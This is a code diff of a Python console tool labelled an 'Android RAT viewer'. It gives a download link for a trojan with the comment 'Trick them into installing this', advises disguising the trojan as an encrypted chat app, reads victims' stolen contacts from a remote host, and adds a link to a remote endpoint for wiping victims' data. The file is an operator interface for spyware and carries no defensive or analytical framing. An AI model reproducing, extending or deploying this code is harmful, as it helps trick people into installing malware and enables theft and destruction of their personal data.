@@ -7,6 +7,7 @@ BLUE = "\033[34m"
 RESET = "\033[0m"
 version = "v0.1"
 ar_link = f"{GREEN}https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.){RESET}"
+delete_data = f"{RED}http://bluntcord.medianewsonline.com/aroid_to/delete.php{RESET}"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
@@ -57,7 +58,7 @@ while True:
 
                       """)
                 print(f"                                         {BLUE}The Trojans url:  {RESET}" + ar_link + f"\n                                         {BLUE}Best way is to make them think it's a encrypted chatting application. {RESET}")
-                print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...{RESET}")
+                print(f"                                         {RED}Dumbass has yet to open the trojan, waiting...\n To wipe data, go to{RESET}" + delete_data)
                 
         else:
             print(f"Received status code {response.status_code}")
